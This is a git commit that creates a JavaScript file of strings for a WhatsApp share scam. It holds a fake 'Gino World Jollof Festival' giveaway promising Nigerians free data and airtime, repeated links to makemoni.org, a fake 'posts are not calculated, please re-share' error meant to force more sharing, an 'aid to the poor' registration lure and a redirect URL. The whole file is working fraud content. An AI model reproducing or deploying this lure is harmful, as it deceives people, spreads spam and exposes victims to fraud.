697515838cb01135a4de263247385707e0d725fd
bestplugg <nsiukpe247@gmail.com>
2025-08-25 07:17:38 +0100

    Create center.js

---
+++ center.js
@@ -0,0 +1,9 @@
+
+        var text1 = "*Gino World Jollof Festival 2025*%0A%0A_*Gino Tomato is giving Nigerians 10GB Free Data and ₦5,000 Airtime to support HILDA BACI in all social media has she is gearing up to make history at the Gino World Jollof Festival 2025*%0A%0AHurry now and grab this amazing offer%0A%0A*For MTN*👇%0Ahttps://makemoni.org/hilda-baci %0A%0A*For Airtel*👇%0Ahttps://makemoni.org/hilda-baci %0A%0A*For Glo*👇%0Ahttps://makemoni.org/hilda-baci %0A%0A*For 9-Mobile*👇%0Ahttps://makemoni.org/hilda-baci",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "http://outrotomr.com/4/3144603",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+ 
